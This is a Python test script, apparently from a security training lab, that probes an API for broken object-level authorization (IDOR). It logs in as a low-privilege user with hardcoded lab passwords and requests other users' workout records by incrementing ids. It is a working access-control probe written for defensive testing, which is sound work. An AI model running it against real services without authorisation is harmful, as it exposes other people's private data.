"""
Broken Object Level Authorization tester  (BOLA / IDOR, OWASP API1:2019)
========================================================================
Logs in as a low-privilege user (bob) and tries to read ANOTHER user's
workout records by walking the numeric object id in:

    GET /api/users/<id>/workouts

A secure API must return 403/404 for objects the caller does not own.

Usage:
    python test_bola.py
Authorised lab use only.
"""
import requests
from common import BASE_URL, TIMEOUT, banner, vuln, safe, info, login, auth_headers

findings = []


def run():
    banner("API1 - Broken Object Level Authorization (BOLA / IDOR)")

    # Authenticate as a normal, low-privilege user.
    token, role, status = login("bob", "password")
    if not token:
        # Hardened build uses a strong password; fall back so the demo still runs.
        token, role, status = login("bob", "Str0ng-Passphrase-99")
    if not token:
        info(f"Could not log in as bob (HTTP {status}); aborting BOLA test")
        return
    info(f"Authenticated as bob (role={role}); bob's own id is expected to be 2")

    own_id = 2
    victim_ids = [1, 3]  # alice and admin

    # Baseline: bob reading his own data should succeed.
    r = requests.get(f"{BASE_URL}/api/users/{own_id}/workouts",
                     headers=auth_headers(token), timeout=TIMEOUT)
    info(f"Reading own workouts (id={own_id}) -> HTTP {r.status_code} (expected 200)")

    for vid in victim_ids:
        r = requests.get(f"{BASE_URL}/api/users/{vid}/workouts",
                         headers=auth_headers(token), timeout=TIMEOUT)
        if r.status_code == 200:
            data = r.json()
            vuln(f"BOLA: bob read user {vid}'s workouts -> {data.get('workouts')}")
            findings.append(f"Horizontal access to user {vid}'s workout objects")
        elif r.status_code in (403, 404):
            safe(f"Access to user {vid} denied (HTTP {r.status_code}) -> ownership enforced")
        else:
            info(f"Unexpected HTTP {r.status_code} for user {vid}")

    print(f"\n  Summary: {len(findings)} BOLA finding(s).")
    for f in findings:
        print(f"    - {f}")


if __name__ == "__main__":
    run()
